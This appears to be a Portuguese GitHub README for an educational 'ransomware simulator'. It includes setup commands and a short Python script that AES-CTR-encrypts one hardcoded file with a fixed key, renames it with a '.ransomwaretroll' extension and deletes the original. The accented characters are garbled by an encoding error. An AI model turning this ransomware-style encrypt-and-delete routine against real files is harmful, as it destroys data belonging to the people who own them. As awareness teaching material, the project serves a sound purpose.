Ransomware Simulator
Este projeto √© um simulador de ransomware desenvolvido para fins educacionais e de conscientiza√ß√£o sobre seguran√ßa cibern√©tica. Ele demonstra como um ataque de ransomware pode criptografar arquivos em um sistema.

üöÄ Funcionalidades
Criptografia de Arquivos: Usa o algoritmo AES (Advanced Encryption Standard) no modo CTR para criptografar arquivos.

Remo√ß√£o Segura do Original: Remove o arquivo original apenas ap√≥s a criptografia bem-sucedida.

Extens√£o Personalizada: Adiciona uma extens√£o personalizada (.ransomwaretroll) ao arquivo criptografado.

üì¶ Melhorias em Rela√ß√£o ao C√≥digo Original
O c√≥digo original foi aprimorado para ser mais seguro, leg√≠vel e eficiente. Aqui est√£o as principais melhorias:

Uso de Context Managers (with):
Substitu√≠ a abertura e fechamento manual de arquivos pelo uso de with, que garante que os arquivos sejam fechados automaticamente, mesmo em caso de erro.

Organiza√ß√£o do c√≥digo:

Par√¢metros como o nome do arquivo, chave de criptografia e extens√£o foram centralizados no in√≠cio do c√≥digo, facilitando a manuten√ß√£o.

Nomenclatura Consistente:

Vari√°veis foram renomeadas para melhorar a clareza do c√≥digo.

Efici√™ncia:

O objeto AES √© criado apenas uma vez, fora do bloco de escrita, evitando redund√¢ncias.

Ordem Correta de Opera√ß√µes:

O arquivo original s√≥ √© removido ap√≥s a criptografia ser conclu√≠da com sucesso, garantindo que nenhum dado seja perdido em caso de falha.

Extens√£o Padronizada:

A extens√£o do arquivo criptografado √© gerada de forma consistente usando f-strings.

‚öôÔ∏è Como Funciona
Leitura do Arquivo:

O arquivo original (teste.txt) √© lido em modo bin√°rio (rb).

Criptografia:

O conte√∫do do arquivo √© criptografado usando o algoritmo AES no modo CTR.

Escrita do Arquivo Criptografado:

O arquivo criptografado √© salvo com a extens√£o .ransomwaretroll.

Remo√ß√£o do Original:

O arquivo original √© removido do sistema ap√≥s a criptografia bem-sucedida.

üöÄ Como Executar
Clone o reposit√≥rio:

bash
Copy
git clone https://github.com/CaioM-git/ransomware-simulator.git
cd ransomware-simulator
Instale as depend√™ncias:

bash
Copy
pip install pyaes
Execute o script:

bash
Copy
python ransomware_simulator.py
Verifique o arquivo criptografado (teste.txt.ransomwaretroll) no diret√≥rio.

üìå Exemplo de Uso
python
Copy
# Constantes configur√°veis
FILE_NAME = "teste.txt"
ENCRYPTION_KEY = b"testeransomwares"
FILE_EXTENSION = ".ransomwaretroll"

# Abre e l√™ o arquivo de forma segura usando context manager
with open(FILE_NAME, "rb") as original_file:
    file_data = original_file.read()

# Cria o objeto AES uma √∫nica vez
aes = AESModeOfOperationCTR(ENCRYPTION_KEY)
crypto_data = aes.encrypt(file_data)

# Escreve o arquivo criptografado com nomenclatura consistente
encrypted_file_name = f"{FILE_NAME}{FILE_EXTENSION}"
with open(encrypted_file_name, "wb") as encrypted_file:
    encrypted_file.write(crypto_data)

# S√≥ remove o original ap√≥s sucesso na criptografia
os.remove(FILE_NAME)
